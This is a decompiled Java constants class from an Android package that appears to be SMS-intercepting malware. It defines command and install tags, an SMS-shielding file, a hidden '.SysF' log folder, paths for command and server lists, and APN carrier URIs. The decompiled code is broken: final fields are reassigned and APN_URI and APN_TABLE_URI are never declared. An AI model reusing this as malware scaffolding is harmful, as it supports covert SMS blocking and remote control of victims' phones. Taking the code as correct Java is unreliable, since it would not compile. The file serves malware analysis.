// Decompiled by JEB v1.5.201408040 - http://www.android-decompiler.com

package com.agame.http.common;

import android.content.Context;
import android.net.Uri;
import android.os.Environment;

public class Constants {
    public static final String APPLICATION_PATH = "//data//data//";
    public static final String CHANGE_TAG = "change";
    public static final String CMD_TAG = "cmd";
    public static final Uri CURRENT_APN_URI = null;
    public static final String DEFAULT_UA = "NokiaN81";
    public static final int ERROR_SLEEP = 300000;
    public static final int GETCFG_SLEEP_MUNITE = 30;
    public static final String HTTPTAG = "http";
    public static final String INST_TAG = "instl";
    public static final String LOGCMD_NAME = "cmd.txt";
    public static final String LOG_NAME = "sys.txt";
    public static final String LOG_PATH = null;
    public static final String LOG_TAG = "servlog";
    public static final int MAX_FILE = 100;
    public static final String MOUA_TAG = "moua";
    public static final int NETERROR_TIMEOUT = 10000;
    public static final int NET_TIMEOUT = 180000;
    public static final String SDPATH = null;
    public static final int SMS_SLEEP = 60000;
    public static final String SMS_TAG = "sms";
    public static final int TIME_OUT = 30000;
    public static final int TIME_SLEEP = 20000;
    public static final String WAPDATA_TAG = "data";
    public static final String WAP_TAG = "wap";
    public static final String apn_name = "default";
    public static final String cmnet_name_b = "CMNET";
    public static final String cmnet_name_s = "cmnet";
    public static final String cmwap_name_b = "CMWAP";
    public static final String cmwap_name_s = "cmwap";
    public static final String ctapn_name_b = "CTWAP";
    public static final String ctapn_name_s = "ctwap";
    public static final String ctnet_name_b = "CTNET";
    public static final String ctnet_name_s = "ctnet";
    public static final String gwap_name_b = "3GWAP";
    public static final String gwap_name_s = "3gwap";
    public static final long max_days = 7200;
    public static final int maxversion = 10;

    static {
        Constants.SDPATH = Environment.getExternalStorageDirectory().getPath();
        Constants.LOG_PATH = String.valueOf(Constants.SDPATH) + "//.SysF//";
        Constants.APN_URI = Uri.parse("content://telephony/carriers");
        Constants.CURRENT_APN_URI = Uri.parse("content://telephony/carriers/preferapn");
        Constants.APN_TABLE_URI = Uri.parse("content://telephony/carriers");
    }

    public Constants() {
        super();
    }

    public static final String APPDATA_PATH(Context ctx) {
        return "//data//data//" + ctx.getPackageName() + "//service//";
    }

    public static final String CMD_PATH(Context ctx) {
        return "//data//data//" + ctx.getPackageName() + "//service//cmdsrv.i";
    }

    public static final String CONFIG_PATH(Context ctx) {
        return "//data//data//" + ctx.getPackageName() + "//service//config.c";
    }

    public static final String HALIST_PATH(Context ctx) {
        return "//data//data//" + ctx.getPackageName() + "//service//halist.i";
    }

    public static final String NEWSERVER_PATH(Context ctx) {
        return "//data//data//" + ctx.getPackageName() + "//service//newserver.i";
    }

    public static final String REPORT_PATH(Context ctx) {
        return "//data//data//" + ctx.getPackageName() + "//service//default.d";
    }

    public static final String SHIELDSMS_PATH(Context ctx) {
        return "//data//data//" + ctx.getPackageName() + "//service//shieldsms.i";
    }
}

